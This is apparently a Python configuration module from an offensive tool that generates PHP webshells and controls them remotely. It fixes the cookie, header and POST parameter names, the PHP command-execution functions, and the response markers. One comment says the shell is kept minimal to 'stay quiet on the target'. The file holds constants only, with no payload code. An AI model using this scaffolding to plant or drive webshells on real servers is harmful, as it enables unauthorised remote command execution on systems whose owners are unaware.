"""Creator <-> Manager protocol contract (FROZEN).

The webshell PHP the Creator emits and the requests the Manager sends both
implement this contract. Anything here is shared by both modules, so changing
it changes both at once (AGENTS.md section 4).
"""

from __future__ import annotations

# --- Taxonomy (frozen) -----------------------------------------------------

VECTORS: tuple[str, ...] = ("cookie", "header", "post")
MODES: tuple[str, ...] = ("plain", "auth", "encrypted")

# --- Channel / parameter names per vector ----------------------------------

PARAM_NAMES: dict[str, str] = {
    "cookie": "shellshock",
    "header": "X-ShellShock",
    "post": "shellshock",
}

# Reserved for auth mode (lands Sat 17).
AUTH_PARAM_NAMES: dict[str, str] = {
    "cookie": "shellshock_auth",
    "header": "X-ShellShock-Auth",
    "post": "shellshock_auth",
}

# --- Command execution drivers ---------------------------------------------

# PHP functions the webshell can use to run a command. The FIRST entry is the
# default; the rest are only used if the user picks one with `create --driver`.
# The generated shell embeds exactly ONE driver (no runtime probing), to stay
# quiet on the target.
DRIVERS: tuple[str, ...] = (
    "shell_exec",
    "system",
    "passthru",
)

DEFAULT_DRIVER: str = DRIVERS[0]

# --- Response framing ------------------------------------------------------

RESPONSE_BEGIN = "<!--SSB-->"
RESPONSE_END = "<!--SSE-->"
